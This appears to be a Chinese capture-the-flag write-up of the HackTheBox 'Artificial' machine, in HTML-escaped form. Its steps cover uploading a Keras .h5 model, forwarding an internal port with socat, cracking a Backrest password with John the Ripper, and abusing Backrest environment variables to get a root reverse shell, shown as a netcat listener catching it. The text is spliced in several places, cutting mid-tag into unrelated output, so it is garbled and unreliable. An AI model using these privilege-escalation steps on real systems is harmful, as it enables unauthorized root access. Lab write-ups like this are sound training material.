=\"hljs-comment\"\u003e# Create hourly data for a week\u003c/span\u003e\nhours = np.arange(0, 24 * 7)\nprofits = np.random.rand(len(hours)) * 100\n\n\u003cspan class=\"hljs-comment\"\u003e# Create a DataFrame\u003c/span\u003e\ndata = pd.DataFrame({\n    \u003cspan class=\"hljs-string\"\u003e'hour'\u003c/span\u003e: hours,\n    \u003cspan class=\"hljs-string\"\u003e'profit'\u003c/span\u003e: profits\n})\n\nX = data[\u003cspan class=\"hljs-string\"\u003e'hour'\u003c/span\u003e].values.reshape(-1, 1)\ny = data[\u003cspan class=\"hljs-string\"\u003e'profit'\u003c/span\u003e].values\n\n\u003cspan class=\"hljs-comment\"\u003e# Build the model\u003c/span\u003e\nmodel = keras.Sequential([\n    layers.Dense(64, activation=\u003cspan class=\"hljs-string\"\u003e'relu'\u003c/span\u003e, input_shape=(1,)),\n    layers.Dense(64, activation=\u003cspan class=\"hljs-string\"\u003e'relu'\u003c/span\u003e),\n    layers.Dense(1)\n])\n\n\u003cspan class=\"hljs-comment\"\u003e# Compile the model\u003c/span\u003e\nmodel.compile(optimizer=\u003cspan class=\"hljs-string\"\u003e'adam'\u003c/span\u003e, loss=\u003cspan class=\"hljs-string\"\u003e'mean_squared_error'\u003c/span\u003e)\n\n\u003cspan class=\"hljs-comment\"\u003e# Train the model\u003c/span\u003e\nmodel.fit(X, y, epochs=100, verbose=1)\n\n\u003cspan class=\"hljs-comment\"\u003e# Save the model\u003c/span\u003e\nmodel.save(\u003cspan class=\"hljs-string\"\u003e'profits_model.h5'\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以创建账户，创建\u003ccode\u003esunset\u003c/code\u003e用户\u003c/p\u003e\n\u003cp\u003e进入到后台有一个文件上传功能点\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们使用主页上面的代码生成\u003ccode\u003eh5\u003c/code\u003e文件后上传，点击 \u003ccode\u003eView Predictions\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image3.png\" alt=\"image.png\"\u003e\u003c/p        LISTEN                  0                       511                                                [::]:80                                               [::]:*                                              \ntcp                    LISTEN                  0                       128                                                [::]:22                                               [::]:*\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们将\u003ccode\u003e9898\u003c/code\u003e使用\u003ccode\u003esocat\u003c/code\u003e转发出去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003egael@artificial:/tmp$ ./socat TCP-LISTEN:9899,fork tcp4:127.0.0.1:9898 \u0026#x26;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eBackrest 是建立在 restic 之上的 Web 可访问备份解决方案。Backrest 提供了一个 WebUI，它包装了 restic CLI，使创建存储库、浏览快照和恢复文件变得容易。此外，Backrest 可以在后台运行，并采取一种有主见的方法来安排快照和编排存储库运行状况作。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e但是需要凭据才能进行登录\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003econfig.json\u003c/code\u003e 需要\u003ccode\u003eroot\u003c/code\u003e权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003egael@artificial:/opt/backrest/.config/backrest$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 24\ndrwxr-xr-x 2 root root 4096 Jun 28 06:43 .\ndrwxr-xr-x 3 root root 4096 Mar  3 21:27 ..\n-rw------- 1 root root 1626 Jun 28 06:43 config.json\n-rw------- 1 root root  280 Jun 28 06:41 config.json.bak.2025-06-28-06-41-12\n-rw------- 1 root root  850 Jun 28 06:43 config.json.bak.2025-06-28-06-43-17\n-rw------- 1 root root 1087 Jun 28 06:43 config.json.bak.2025-06-28-06-43-39\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后在\u003ccode\u003e/var/baskups\u003c/code\u003e中能找到\u003ccode\u003ebackrest_backup.tar.gz\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hl c/span\u003e status\n!@#$%^           (?)     \n1g 0:00:00:37 DONE (2025-06-28 15:16) 0.02643g/s 142.7p/s 142.7c/s 142.7C/s lightbulb..huevos\nUse the \u003cspan class=\"hljs-string\"\u003e\"--show\"\u003c/span\u003e option to display all of the cracked passwords reliably\nSession completed. \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后得到密码：\u003ccode\u003e!@#$%^\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e使用凭据成功进入后台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e因为服务是通过 \u003ccode\u003eroot\u003c/code\u003e权限运行的，我们可以设置存储库到\u003ccode\u003eroot\u003c/code\u003e的家目录中，BackrestWiki：\u003ca href=\"https://garethgeorge.github.io/backrest/introduction/getting-started\"\u003ehttps://garethgeorge.github.io/backrest/introduction/getting-started\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e添加存储库时，我们可以存储库文档\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e并且可以通过环境变量进行命令执行\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e设置环境变量\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Artificial/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们点击 “\u003ccode\u003esubmit\u003c/code\u003e”时就能将\u003ccode\u003eRoot shell\u003c/code\u003e弹过来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Artificial nc -lvp 1234                \nlistening on [any] 1234 ...\nconnect to [10.10.16.7] from artificial.htb [10.10.11.74] 57440\nbash: cannot \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e terminal process group (142145): Inappropriate ioctl \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e device\nbash: no job control \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u00
